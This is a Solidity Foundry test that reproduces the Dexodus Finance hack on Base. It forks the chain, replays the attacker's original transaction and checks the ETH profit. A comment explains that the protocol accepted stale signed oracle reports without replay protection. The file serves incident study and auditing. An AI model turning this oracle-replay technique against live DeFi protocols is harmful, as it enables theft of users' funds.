// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

/*
    @KeyInfo
    - Total Lost: ~$300K
    - Attacker: 0x863D3B920a6D98D5689D2cB8Bb0D61E90a91e0dc
    - Attack Contract: 0xbcCd57B49f4478AC26EC3aC642C6ed27D1FBC9A5
    - Attack Tx: https://basescan.org/tx/0x6ffb494293fc5c32c5a6ab7dc3fff1fcc6e90fba9a6d6e486ba0a15ce518147e
    - Analysis: https://www.quillaudits.com/blog/hack-analysis/dexodus-finance-exploit

    Dexodus accepted a previously valid signed oracle report without adequate
    freshness or replay protection. The stale report opened a leveraged long at
    roughly $1,816 before a fresh report closed it near $2,520.
*/

contract DexodusExploitTest is Test {
    bytes32 private constant ATTACK_TX = 0x6ffb494293fc5c32c5a6ab7dc3fff1fcc6e90fba9a6d6e486ba0a15ce518147e;
    address private constant ATTACKER = 0x863D3B920a6D98D5689D2cB8Bb0D61E90a91e0dc;

    function setUp() public {
        vm.createSelectFork("base", 30_737_029);
    }

    function testExploit() public {
        uint256 ethBefore = ATTACKER.balance;
        vm.transact(ATTACK_TX);
        uint256 ethProfit = ATTACKER.balance - ethBefore;

        emit log_named_decimal_uint("ETH profit", ethProfit, 18);
        assertEq(ethProfit, 113.428_616_237_718_218_074 ether);
    }
}
